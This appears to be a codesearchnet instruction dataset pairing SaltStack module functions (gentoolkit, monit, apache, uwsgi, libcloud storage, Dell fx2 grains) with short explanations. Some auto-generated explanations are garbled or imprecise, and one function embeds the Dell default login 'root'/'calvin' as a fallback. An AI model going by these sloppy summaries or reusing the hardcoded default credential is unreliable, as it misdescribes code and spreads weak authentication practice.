{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef eclean_dist(destructive=False, package_names=False, size_limit=0,\n                time_limit=0, fetch_restricted=False,\n                exclude_file='/etc/eclean/distfiles.exclude'):\n    '''\n    Clean obsolete portage sources\n\n    destructive\n        Only keep minimum for reinstallation\n\n    package_names\n        Protect all versions of installed packages. Only meaningful if used\n        with destructive=True\n\n    size_limit <size>\n        Don't delete distfiles bigger than <size>.\n        <size> is a size specification: \"10M\" is \"ten megabytes\",\n        \"200K\" is \"two hundreds kilobytes\", etc. Units are: G, M, K and B.\n\n    time_limit <time>\n        Don't delete distfiles files modified since <time>\n        <time> is an amount of time: \"1y\" is \"one year\", \"2w\" is\n        \"two weeks\", etc. Units are: y (years), m (months), w (weeks),\n        d (days) and h (hours).\n\n    fetch_restricted\n        Protect fetch-restricted files. Only meaningful if used with\n        destructive=True\n\n    exclude_file\n        Path to exclusion file. Default is /etc/eclean/distfiles.exclude\n        This is the same default eclean-dist uses. Use None if this file\n        exists and you want to ignore.\n\n    Returns a dict containing the cleaned, saved, and deprecated dists:\n\n    .. code-block:: python\n\n        {'cleaned': {<dist file>: <size>},\n         'deprecated': {<package>: <dist file>},\n         'saved': {<package>: <dist file>},\n         'total_cleaned': <size>}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' gentoolkit.eclean_dist destructive=True\n    '''\n    if exclude_file is None:\n        exclude = None\n    else:\n        try:\n            exclude = _parse_exclude(exclude_file)\n        except excludemod.ParseExcludeFileException as e:\n            ret = {e: 'Invalid exclusion file: {0}'.format(exclude_file)}\n            return ret\n\n    if time_limit != 0:\n        time_limit = cli.parseTime(time_limit)\n    if size_limit != 0:\n        size_limit = cli.parseSize(size_limit)\n\n    clean_size = 0\n    engine = search.DistfilesSearch(lambda x: None)\n    clean_me, saved, deprecated = engine.findDistfiles(\n        destructive=destructive, package_names=package_names,\n        size_limit=size_limit, time_limit=time_limit,\n        fetch_restricted=fetch_restricted, exclude=exclude)\n\n    cleaned = dict()\n\n    def _eclean_progress_controller(size, key, *args):\n        cleaned[key] = _pretty_size(size)\n        return True\n\n    if clean_me:\n        cleaner = clean.CleanUp(_eclean_progress_controller)\n        clean_size = cleaner.clean_dist(clean_me)\n\n    ret = {'cleaned': cleaned, 'saved': saved, 'deprecated': deprecated,\n           'total_cleaned': _pretty_size(clean_size)}\n    return ret", "response": "Clean obsolete portage sources and return a dict containing the cleaned saved and deprecated dists."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef eclean_pkg(destructive=False, package_names=False, time_limit=0,\n               exclude_file='/etc/eclean/packages.exclude'):\n    '''\n    Clean obsolete binary packages\n\n    destructive\n        Only keep minimum for reinstallation\n\n    package_names\n        Protect all versions of installed packages. Only meaningful if used\n        with destructive=True\n\n    time_limit <time>\n        Don't delete distfiles files modified since <time>\n        <time> is an amount of time: \"1y\" is \"one year\", \"2w\" is\n        \"two weeks\", etc. Units are: y (years), m (months), w (weeks),\n        d (days) and h (hours).\n\n    exclude_file\n        Path to exclusion file. Default is /etc/eclean/packages.exclude\n        This is the same default eclean-pkg uses. Use None if this file\n        exists and you want to ignore.\n\n    Returns a dict containing the cleaned binary packages:\n\n    .. code-block:: python\n\n        {'cleaned': {<dist file>: <size>},\n         'total_cleaned': <size>}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' gentoolkit.eclean_pkg destructive=True\n    '''\n    if exclude_file is None:\n        exclude = None\n    else:\n        try:\n            exclude = _parse_exclude(exclude_file)\n        except excludemod.ParseExcludeFileException as e:\n            ret = {e: 'Invalid exclusion file: {0}'.format(exclude_file)}\n            return ret\n\n    if time_limit != 0:\n        time_limit = cli.parseTime(time_limit)\n\n    clean_size = 0\n    # findPackages requires one arg, but does nothing with it.\n    # So we will just pass None in for the required arg\n    clean_me = search.findPackages(None, destructive=destructive,\n                                   package_names=package_names,\n                                   time_limit=time_limit, exclude=exclude,\n                                   pkgdir=search.pkgdir)\n\n    cleaned = dict()\n\n    def _eclean_progress_controller(size, key, *args):\n        cleaned[key] = _pretty_size(size)\n        return True\n\n    if clean_me:\n        cleaner = clean.CleanUp(_eclean_progress_controller)\n        clean_size = cleaner.clean_pkgs(clean_me, search.pkgdir)\n\n    ret = {'cleaned': cleaned,\n           'total_cleaned': _pretty_size(clean_size)}\n    return ret", "response": "Clean obsolete binary packages with optional exclusion file."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nprocess output from glsa_check_list into a dict containing the glsa id description status and CVEs", "response": "def _glsa_list_process_output(output):\n    '''\n    Process output from glsa_check_list into a dict\n\n    Returns a dict containing the glsa id, description, status, and CVEs\n    '''\n    ret = dict()\n    for line in output:\n        try:\n            glsa_id, status, desc = line.split(None, 2)\n            if 'U' in status:\n                status += ' Not Affected'\n            elif 'N' in status:\n                status += ' Might be Affected'\n            elif 'A' in status:\n                status += ' Applied (injected)'\n            if 'CVE' in desc:\n                desc, cves = desc.rsplit(None, 1)\n                cves = cves.split(',')\n            else:\n                cves = list()\n            ret[glsa_id] = {'description': desc, 'status': status,\n                            'CVEs': cves}\n        except ValueError:\n            pass\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nlists the status of Gentoo Linux Security Advisories and return a dict containing the status of the GLSA files that are affected by the GLSAs.", "response": "def glsa_check_list(glsa_list):\n    '''\n    List the status of Gentoo Linux Security Advisories\n\n    glsa_list\n         can contain an arbitrary number of GLSA ids, filenames\n         containing GLSAs or the special identifiers 'all' and 'affected'\n\n    Returns a dict containing glsa ids with a description, status, and CVEs:\n\n    .. code-block:: python\n\n        {<glsa_id>: {'description': <glsa_description>,\n         'status': <glsa status>,\n         'CVEs': [<list of CVEs>]}}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' gentoolkit.glsa_check_list 'affected'\n    '''\n    cmd = 'glsa-check --quiet --nocolor --cve --list '\n    if isinstance(glsa_list, list):\n        for glsa in glsa_list:\n            cmd += glsa + ' '\n    elif glsa_list == 'all' or glsa_list == 'affected':\n        cmd += glsa_list\n\n    ret = dict()\n    out = __salt__['cmd.run'](cmd, python_shell=False).split('\\n')\n    ret = _glsa_list_process_output(out)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef summary(svc_name=''):\n    '''\n    Display a summary from monit\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' monit.summary\n        salt '*' monit.summary <service name>\n    '''\n    ret = {}\n    cmd = 'monit summary'\n    res = __salt__['cmd.run'](cmd).splitlines()\n    for line in res:\n        if 'daemon is not running' in line:\n            return dict(monit='daemon is not running', result=False)\n        elif not line or svc_name not in line or 'The Monit daemon' in line:\n            continue\n        else:\n            parts = line.split('\\'')\n            if len(parts) == 3:\n                resource, name, status_ = (\n                    parts[0].strip(), parts[1], parts[2].strip()\n                )\n                if svc_name != '' and svc_name != name:\n                    continue\n                if resource not in ret:\n                    ret[resource] = {}\n                ret[resource][name] = status_\n    return ret", "response": "Display a summary from monit. summary\n    CLI Example"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef status(svc_name=''):\n    '''\n    Display a process status from monit\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' monit.status\n        salt '*' monit.status <service name>\n    '''\n    cmd = 'monit status'\n    res = __salt__['cmd.run'](cmd)\n    prostr = 'Process'+' '*28\n    s = res.replace('Process', prostr).replace(\"'\", '').split('\\n\\n')\n    entries = {}\n    for process in s[1:-1]:\n        pro = process.splitlines()\n        tmp = {}\n        for items in pro:\n            key = items[:36].strip()\n            tmp[key] = items[35:].strip()\n        entries[pro[0].split()[1]] = tmp\n    if svc_name == '':\n        ret = entries\n    else:\n        ret = entries.get(svc_name, 'No such service')\n    return ret", "response": "Display a process status from monit"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef id_(reset=False):\n    '''\n    .. versionadded:: 2016.3.0\n\n    Return monit unique id.\n\n    reset : False\n        Reset current id and generate a new id when it's True.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' monit.id [reset=True]\n    '''\n    if reset:\n        id_pattern = re.compile(r'Monit id (?P<id>[^ ]+)')\n        cmd = 'echo y|monit -r'\n        out = __salt__['cmd.run_all'](cmd, python_shell=True)\n        ret = id_pattern.search(out['stdout']).group('id')\n        return ret if ret else False\n    else:\n        cmd = 'monit -i'\n        out = __salt__['cmd.run'](cmd)\n        ret = out.split(':')[-1].strip()\n    return ret", "response": "Return monit unique id."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef search_onfail_requisites(sid, highstate):\n    '''\n    For a particular low chunk, search relevant onfail related states\n    '''\n    onfails = []\n    if '_|-' in sid:\n        st = salt.state.split_low_tag(sid)\n    else:\n        st = {'__id__': sid}\n    for fstate, fchunks in six.iteritems(highstate):\n        if fstate == st['__id__']:\n            continue\n        else:\n            for mod_, fchunk in six.iteritems(fchunks):\n                if (\n                    not isinstance(mod_, six.string_types) or\n                    mod_.startswith('__')\n                ):\n                    continue\n                else:\n                    if not isinstance(fchunk, list):\n                        continue\n                    else:\n                        # bydefault onfail will fail, but you can\n                        # set onfail_stop: False to prevent the highstate\n                        # to stop if you handle it\n                        onfail_handled = False\n                        for fdata in fchunk:\n                            if not isinstance(fdata, dict):\n                                continue\n                            onfail_handled = (fdata.get('onfail_stop', True)\n                                              is False)\n                            if onfail_handled:\n                                break\n                        if not onfail_handled:\n                            continue\n                        for fdata in fchunk:\n                            if not isinstance(fdata, dict):\n                                continue\n                            for knob, fvalue in six.iteritems(fdata):\n                                if knob != 'onfail':\n                                    continue\n                                for freqs in fvalue:\n                                    for fmod, fid in six.iteritems(freqs):\n                                        if not (\n                                            fid == st['__id__'] and\n                                            fmod == st.get('state', fmod)\n                                        ):\n                                            continue\n                                        onfails.append((fstate, mod_, fchunk))\n    return onfails", "response": "Search relevant onfail related states"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef check_onfail_requisites(state_id, state_result, running, highstate):\n    '''\n    When a state fail and is part of a highstate, check\n    if there is onfail requisites.\n    When we find onfail requisites, we will consider the state failed\n    only if at least one of those onfail requisites also failed\n\n    Returns:\n\n        True: if onfail handlers suceeded\n        False: if one on those handler failed\n        None: if the state does not have onfail requisites\n\n    '''\n    nret = None\n    if (\n        state_id and state_result and\n        highstate and isinstance(highstate, dict)\n    ):\n        onfails = search_onfail_requisites(state_id, highstate)\n        if onfails:\n            for handler in onfails:\n                fstate, mod_, fchunk = handler\n                for rstateid, rstate in six.iteritems(running):\n                    if '_|-' in rstateid:\n                        st = salt.state.split_low_tag(rstateid)\n                    # in case of simple state, try to guess\n                    else:\n                        id_ = rstate.get('__id__', rstateid)\n                        if not id_:\n                            raise ValueError('no state id')\n                        st = {'__id__': id_, 'state': mod_}\n                    if mod_ == st['state'] and fstate == st['__id__']:\n                        ofresult = rstate.get('result', _empty)\n                        if ofresult in [False, True]:\n                            nret = ofresult\n                        if ofresult is False:\n                            # as soon as we find an errored onfail, we stop\n                            break\n                # consider that if we parsed onfailes without changing\n                # the ret, that we have failed\n                if nret is None:\n                    nret = False\n    return nret", "response": "Check if onfail requisites are in the state"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef check_result(running, recurse=False, highstate=None):\n    '''\n    Check the total return value of the run and determine if the running\n    dict has any issues\n    '''\n    if not isinstance(running, dict):\n        return False\n\n    if not running:\n        return False\n\n    ret = True\n    for state_id, state_result in six.iteritems(running):\n        expected_type = dict\n        # The __extend__ state is a list\n        if \"__extend__\" == state_id:\n            expected_type = list\n        if not recurse and not isinstance(state_result, expected_type):\n            ret = False\n        if ret and isinstance(state_result, dict):\n            result = state_result.get('result', _empty)\n            if result is False:\n                ret = False\n            # only override return value if we are not already failed\n            elif result is _empty and isinstance(state_result, dict) and ret:\n                ret = check_result(\n                    state_result, recurse=True, highstate=highstate)\n        # if we detect a fail, check for onfail requisites\n        if not ret:\n            # ret can be None in case of no onfail reqs, recast it to bool\n            ret = bool(check_onfail_requisites(state_id, state_result,\n                                               running, highstate))\n        # return as soon as we got a failure\n        if not ret:\n            break\n    return ret", "response": "Check the total return value of the run and determine if the running dict has any issues\n   "}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nmerging a state return with another state return.", "response": "def merge_subreturn(original_return, sub_return, subkey=None):\n    '''\n    Update an existing state return (`original_return`) in place\n    with another state return (`sub_return`), i.e. for a subresource.\n\n    Returns:\n        dict: The updated state return.\n\n    The existing state return does not need to have all the required fields,\n    as this is meant to be called from the internals of a state function,\n    but any existing data will be kept and respected.\n\n    It is important after using this function to check the return value\n    to see if it is False, in which case the main state should return.\n    Prefer to check `_ret['result']` instead of `ret['result']`,\n    as the latter field may not yet be populated.\n\n    Code Example:\n\n    .. code-block:: python\n        def state_func(name, config, alarm=None):\n            ret = {'name': name, 'comment': '', 'changes': {}}\n            if alarm:\n                _ret = __states__['subresource.managed'](alarm)\n                __utils__['state.merge_subreturn'](ret, _ret)\n                if _ret['result'] is False:\n                    return ret\n    '''\n    if not subkey:\n        subkey = sub_return['name']\n\n    if sub_return['result'] is False:\n        # True or None stay the same\n        original_return['result'] = sub_return['result']\n\n    sub_comment = sub_return['comment']\n    if not isinstance(sub_comment, list):\n        sub_comment = [sub_comment]\n    original_return.setdefault('comment', [])\n    if isinstance(original_return['comment'], list):\n        original_return['comment'].extend(sub_comment)\n    else:\n        if original_return['comment']:\n            # Skip for empty original comments\n            original_return['comment'] += '\\n'\n        original_return['comment'] += '\\n'.join(sub_comment)\n\n    if sub_return['changes']:  # changes always exists\n        original_return.setdefault('changes', {})\n        original_return['changes'][subkey] = sub_return['changes']\n\n    return original_return"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a copy of the opts for use optionally load a local config on top", "response": "def get_sls_opts(opts, **kwargs):\n    '''\n    Return a copy of the opts for use, optionally load a local config on top\n    '''\n    opts = copy.deepcopy(opts)\n\n    if 'localconfig' in kwargs:\n        return salt.config.minion_config(kwargs['localconfig'], defaults=opts)\n\n    if 'saltenv' in kwargs:\n        saltenv = kwargs['saltenv']\n        if saltenv is not None:\n            if not isinstance(saltenv, six.string_types):\n                saltenv = six.text_type(saltenv)\n            if opts['lock_saltenv'] and saltenv != opts['saltenv']:\n                raise CommandExecutionError(\n                    'lock_saltenv is enabled, saltenv cannot be changed'\n                )\n            opts['saltenv'] = kwargs['saltenv']\n\n    pillarenv = None\n    if kwargs.get('pillarenv'):\n        pillarenv = kwargs.get('pillarenv')\n    if opts.get('pillarenv_from_saltenv') and not pillarenv:\n        pillarenv = kwargs.get('saltenv')\n    if pillarenv is not None and not isinstance(pillarenv, six.string_types):\n        opts['pillarenv'] = six.text_type(pillarenv)\n    else:\n        opts['pillarenv'] = pillarenv\n\n    return opts"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef check_site_enabled(site):\n    '''\n    Checks to see if the specific site symlink is in /etc/apache2/sites-enabled.\n\n    This will only be functional on Debian-based operating systems (Ubuntu,\n    Mint, etc).\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' apache.check_site_enabled example.com\n        salt '*' apache.check_site_enabled example.com.conf\n    '''\n    if site.endswith('.conf'):\n        site_file = site\n    else:\n        site_file = '{0}.conf'.format(site)\n    if os.path.islink('{0}/{1}'.format(SITE_ENABLED_DIR, site_file)):\n        return True\n    elif site == 'default' and \\\n            os.path.islink('{0}/000-{1}'.format(SITE_ENABLED_DIR, site_file)):\n        return True\n    else:\n        return False", "response": "Checks to see if the specific site symlink is in the apache2 site - enabled directory."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef a2dissite(site):\n    '''\n    Runs a2dissite for the given site.\n\n    This will only be functional on Debian-based operating systems (Ubuntu,\n    Mint, etc).\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' apache.a2dissite example.com\n    '''\n    ret = {}\n    command = ['a2dissite', site]\n\n    try:\n        status = __salt__['cmd.retcode'](command, python_shell=False)\n    except Exception as e:\n        return e\n\n    ret['Name'] = 'Apache2 Disable Site'\n    ret['Site'] = site\n\n    if status == 256:\n        ret['Status'] = 'Site {0} Not found'.format(site)\n    elif status == 0:\n        ret['Status'] = 'Site {0} disabled'.format(site)\n    else:\n        ret['Status'] = status\n\n    return ret", "response": "Runs a2dissite for the given site."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncheck to see if the specific mod symlink is in the apache2 mods - enabled directory.", "response": "def check_mod_enabled(mod):\n    '''\n    Checks to see if the specific mod symlink is in /etc/apache2/mods-enabled.\n\n    This will only be functional on Debian-based operating systems (Ubuntu,\n    Mint, etc).\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' apache.check_mod_enabled status\n        salt '*' apache.check_mod_enabled status.load\n        salt '*' apache.check_mod_enabled status.conf\n    '''\n    if mod.endswith('.load') or mod.endswith('.conf'):\n        mod_file = mod\n    else:\n        mod_file = '{0}.load'.format(mod)\n    return os.path.islink('/etc/apache2/mods-enabled/{0}'.format(mod_file))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nruns a2enmod for the given mod.", "response": "def a2enmod(mod):\n    '''\n    Runs a2enmod for the given mod.\n\n    This will only be functional on Debian-based operating systems (Ubuntu,\n    Mint, etc).\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' apache.a2enmod vhost_alias\n    '''\n    ret = {}\n    command = ['a2enmod', mod]\n\n    try:\n        status = __salt__['cmd.retcode'](command, python_shell=False)\n    except Exception as e:\n        return e\n\n    ret['Name'] = 'Apache2 Enable Mod'\n    ret['Mod'] = mod\n\n    if status == 1:\n        ret['Status'] = 'Mod {0} Not found'.format(mod)\n    elif status == 0:\n        ret['Status'] = 'Mod {0} enabled'.format(mod)\n    else:\n        ret['Status'] = status\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks to see if the specific conf symlink is in the apache2 conf - enabled directory", "response": "def check_conf_enabled(conf):\n    '''\n    .. versionadded:: 2016.3.0\n\n    Checks to see if the specific conf symlink is in /etc/apache2/conf-enabled.\n\n    This will only be functional on Debian-based operating systems (Ubuntu,\n    Mint, etc).\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' apache.check_conf_enabled security\n        salt '*' apache.check_conf_enabled security.conf\n    '''\n    if conf.endswith('.conf'):\n        conf_file = conf\n    else:\n        conf_file = '{0}.conf'.format(conf)\n    return os.path.islink('/etc/apache2/conf-enabled/{0}'.format(conf_file))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef a2enconf(conf):\n    '''\n    .. versionadded:: 2016.3.0\n\n    Runs a2enconf for the given conf.\n\n    This will only be functional on Debian-based operating systems (Ubuntu,\n    Mint, etc).\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt '*' apache.a2enconf security\n    '''\n    ret = {}\n    command = ['a2enconf', conf]\n\n    try:\n        status = __salt__['cmd.retcode'](command, python_shell=False)\n    except Exception as e:\n        return e\n\n    ret['Name'] = 'Apache2 Enable Conf'\n    ret['Conf'] = conf\n\n    if status == 1:\n        ret['Status'] = 'Conf {0} Not found'.format(conf)\n    elif status == 0:\n        ret['Status'] = 'Conf {0} enabled'.format(conf)\n    else:\n        ret['Status'] = status\n\n    return ret", "response": "Runs apache. a2enconf for the given conf"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef stats(socket):\n    '''\n    Return the data from `uwsgi --connect-and-read` as a dictionary.\n\n    socket\n        The socket the uWSGI stats server is listening on\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' uwsgi.stats /var/run/mystatsserver.sock\n\n        salt '*' uwsgi.stats 127.0.0.1:5050\n    '''\n\n    cmd = ['uwsgi', '--connect-and-read', '{0}'.format(socket)]\n    out = __salt__['cmd.run'](cmd, python_shell=False)\n    return salt.utils.json.loads(out)", "response": "Return the data from uWSGI stats server as a dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nfinding all the possible credentials and return the first one that works", "response": "def _find_credentials():\n    '''\n    Cycle through all the possible credentials and return the first one that\n    works\n    '''\n    usernames = []\n    usernames.append(__pillar__['proxy'].get('admin_username', 'root'))\n    if 'fallback_admin_username' in __pillar__.get('proxy'):\n        usernames.append(__pillar__['proxy'].get('fallback_admin_username'))\n\n    for user in usernames:\n        for pwd in __pillar__['proxy']['passwords']:\n            r = salt.modules.dracr.get_chassis_name(\n                host=__pillar__['proxy']['host'],\n                admin_username=user,\n                admin_password=pwd)\n            # Retcode will be present if the chassis_name call failed\n            try:\n                if r.get('retcode', None) is None:\n                    __opts__['proxy']['admin_username'] = user\n                    __opts__['proxy']['admin_password'] = pwd\n                    return (user, pwd)\n            except AttributeError:\n                # Then the above was a string, and we can return the username\n                # and password\n                __opts__['proxy']['admin_username'] = user\n                __opts__['proxy']['admin_password'] = pwd\n                return (user, pwd)\n\n    logger.debug('grains fx2.find_credentials found no valid credentials, using Dell default')\n    return ('root', 'calvin')"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _grains():\n    '''\n    Get the grains from the proxied device\n    '''\n    (username, password) = _find_credentials()\n    r = salt.modules.dracr.system_info(host=__pillar__['proxy']['host'],\n                                       admin_username=username,\n                                       admin_password=password)\n\n    if r.get('retcode', 0) == 0:\n        GRAINS_CACHE = r\n    else:\n        GRAINS_CACHE = {}\n\n    GRAINS_CACHE.update(salt.modules.dracr.inventory(host=__pillar__['proxy']['host'],\n                                                     admin_username=username,\n                                                     admin_password=password))\n\n    return GRAINS_CACHE", "response": "Get the grains from the proxied device\n   "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a list of containers in a profile", "response": "def list_containers(profile, **libcloud_kwargs):\n    '''\n    Return a list of containers.\n\n    :param profile: The profile key\n    :type  profile: ``str``\n\n    :param libcloud_kwargs: Extra arguments for the driver's list_containers method\n    :type  libcloud_kwargs: ``dict``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt myminion libcloud_storage.list_containers profile1\n    '''\n    conn = _get_driver(profile=profile)\n    libcloud_kwargs = salt.utils.args.clean_kwargs(**libcloud_kwargs)\n    containers = conn.list_containers(**libcloud_kwargs)\n    ret = []\n    for container in containers:\n        ret.append({\n            'name': container.name,\n            'extra': container.extra\n        })\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nlisting container objects on the given profile", "response": "def list_container_objects(container_name, profile, **libcloud_kwargs):\n    '''\n    List container objects (e.g. files) for the given container_id on the given profile\n\n    :param container_name: Container name\n    :type  container_name: ``str``\n\n    :param profile: The profile key\n    :type  profile: ``str``\n\n    :param libcloud_kwargs: Extra arguments for the driver's list_container_objects method\n    :type  libcloud_kwargs: ``dict``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt myminion libcloud_storage.list_container_objects MyFolder profile1\n    '''\n    conn = _get_driver(profile=profile)\n    container = conn.get_container(container_name)\n    libcloud_kwargs = salt.utils.args.clean_kwargs(**libcloud_kwargs)\n    objects = conn.list_container_objects(container, **libcloud_kwargs)\n    ret = []\n    for obj in objects:\n        ret.append({\n            'name': obj.name,\n            'size': obj.size,\n            'hash': obj.hash,\n            'container': obj.container.name,\n            'extra': obj.extra,\n            'meta_data': obj.meta_data\n        })\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create_container(container_name, profile, **libcloud_kwargs):\n    '''\n    Create a container in the cloud\n\n    :param container_name: Container name\n    :type  container_name: ``str``\n\n    :param profile: The profile key\n    :type  profile: ``str``\n\n    :param libcloud_kwargs: Extra arguments for the driver's create_container method\n    :type  libcloud_kwargs: ``dict``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt myminion libcloud_storage.create_container MyFolder profile1\n    '''\n    conn = _get_driver(profile=profile)\n    libcloud_kwargs = salt.utils.args.clean_kwargs(**libcloud_kwargs)\n    container = conn.create_container(container_name, **libcloud_kwargs)\n    return {\n        'name': container.name,\n        'extra': container.extra\n        }", "response": "Create a container in the cloud"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget the details for a container object", "response": "def get_container_object(container_name, object_name, profile, **libcloud_kwargs):\n    '''\n    Get the details for a container object (file or object in the cloud)\n\n    :param container_name: Container name\n    :type  container_name: ``str``\n\n    :param object_name: Object name\n    :type  object_name: ``str``\n\n    :param profile: The profile key\n    :type  profile: ``str``\n\n    :param libcloud_kwargs: Extra arguments for the driver's get_container_object method\n    :type  libcloud_kwargs: ``dict``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt myminion libcloud_storage.get_container_object MyFolder MyFile.xyz profile1\n    '''\n    conn = _get_driver(profile=profile)\n    libcloud_kwargs = salt.utils.args.clean_kwargs(**libcloud_kwargs)\n    obj = conn.get_container_object(container_name, object_name, **libcloud_kwargs)\n    return {\n        'name': obj.name,\n        'size': obj.size,\n        'hash': obj.hash,\n        'container': obj.container.name,\n        'extra': obj.extra,\n        'meta_data': obj.meta_data}"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef download_object(container_name, object_name, destination_path, profile,\n                    overwrite_existing=False, delete_on_failure=True, **libcloud_kwargs):\n    '''\n    Download an object to the specified destination path.\n\n    :param container_name: Container name\n    :type  container_name: ``str``\n\n    :param object_name: Object name\n    :type  object_name: ``str``\n\n    :param destination_path: Full path to a file or a directory where the\n                                incoming file will be saved.\n    :type destination_path: ``str``\n\n    :param profile: The profile key\n    :type  profile: ``str``\n\n    :param overwrite_existing: True to overwrite an existing file,\n                                defaults to False.\n    :type overwrite_existing: ``bool``\n\n    :param delete_on_failure: True to delete a partially downloaded file if\n                                the download was not successful (hash\n                                mismatch / file size).\n    :type delete_on_failure: ``bool``\n\n    :param libcloud_kwargs: Extra arguments for the driver's download_object method\n    :type  libcloud_kwargs: ``dict``\n\n    :return: True if an object has been successfully downloaded, False\n                otherwise.\n    :rtype: ``bool``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt myminion libcloud_storage.download_object MyFolder me.jpg /tmp/me.jpg profile1\n\n    '''\n    conn = _get_driver(profile=profile)\n    obj = conn.get_object(container_name, object_name)\n    libcloud_kwargs = salt.utils.args.clean_kwargs(**libcloud_kwargs)\n    return conn.download_object(obj, destination_path, overwrite_existing, delete_on_failure, **libcloud_kwargs)", "response": "Download an object from the specified container to the specified destination path."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef upload_object(file_path, container_name, object_name, profile, extra=None,\n                  verify_hash=True, headers=None, **libcloud_kwargs):\n    '''\n    Upload an object currently located on a disk.\n\n    :param file_path: Path to the object on disk.\n    :type file_path: ``str``\n\n    :param container_name: Destination container.\n    :type container_name: ``str``\n\n    :param object_name: Object name.\n    :type object_name: ``str``\n\n    :param profile: The profile key\n    :type  profile: ``str``\n\n    :param verify_hash: Verify hash\n    :type verify_hash: ``bool``\n\n    :param extra: Extra attributes (driver specific). (optional)\n    :type extra: ``dict``\n\n    :param headers: (optional) Additional request headers,\n        such as CORS headers. For example:\n        headers = {'Access-Control-Allow-Origin': 'http://mozilla.com'}\n    :type headers: ``dict``\n\n    :param libcloud_kwargs: Extra arguments for the driver's upload_object method\n    :type  libcloud_kwargs: ``dict``\n\n    :return: The object name in the cloud\n    :rtype: ``str``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt myminion libcloud_storage.upload_object /file/to/me.jpg MyFolder me.jpg profile1\n\n    '''\n    conn = _get_driver(profile=profile)\n    libcloud_kwargs = salt.utils.args.clean_kwargs(**libcloud_kwargs)\n    container = conn.get_container(container_name)\n    obj = conn.upload_object(file_path, container, object_name, extra, verify_hash, headers, **libcloud_kwargs)\n    return obj.name", "response": "Uploads an object to the specified container on the specified profile."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndeleting an object in the cloud object store", "response": "def delete_object(container_name, object_name, profile, **libcloud_kwargs):\n    '''\n    Delete an object in the cloud\n\n    :param container_name: Container name\n    :type  container_name: ``str``\n\n    :param object_name: Object name\n    :type  object_name: ``str``\n\n    :param profile: The profile key\n    :type  profile: ``str``\n\n    :param libcloud_kwargs: Extra arguments for the driver's delete_object method\n    :type  libcloud_kwargs: ``dict``\n\n    :return: True if an object has been successfully deleted, False\n                otherwise.\n    :rtype: ``bool``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt myminion libcloud_storage.delete_object MyFolder me.jpg profile1\n    '''\n    conn = _get_driver(profile=profile)\n    libcloud_kwargs = salt.utils.args.clean_kwargs(**libcloud_kwargs)\n    obj = conn.get_object(container_name, object_name, **libcloud_kwargs)\n    return conn.delete_object(obj)"}
